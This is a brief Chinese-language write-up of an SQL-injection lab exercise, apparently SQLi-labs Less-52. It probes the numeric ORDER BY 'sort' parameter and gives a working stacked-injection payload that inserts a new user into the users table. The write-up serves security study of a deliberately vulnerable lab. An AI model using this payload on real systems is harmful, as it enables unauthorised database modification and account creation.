# GET -Blind based -ORDER BY CLAUSE -numeric -Stacked injection  
TAG：GET型注入、堆叠注入、ORDER BY参数可控、盲注  
## 漏洞利用
![less52_1](images\less52_1.png)  
  
这次的页面什么报错也没有剩下  
![less52_1](images\less52_2.png)  
  
![less52_1](images\less52_3.png)  
  
![less52_1](images\less52_4.png)  
当?sort=1时正常回显，?sort=1'与?sort=1"时都无法回显推测其为整形参数  
  
构造堆叠注入语句插入新用户  
payload:```?sort=1;insert into users(id,username,password) values ('27','less52','hello')--+```  
堆叠注入成功  
![less52_5](images\less52_5.png)  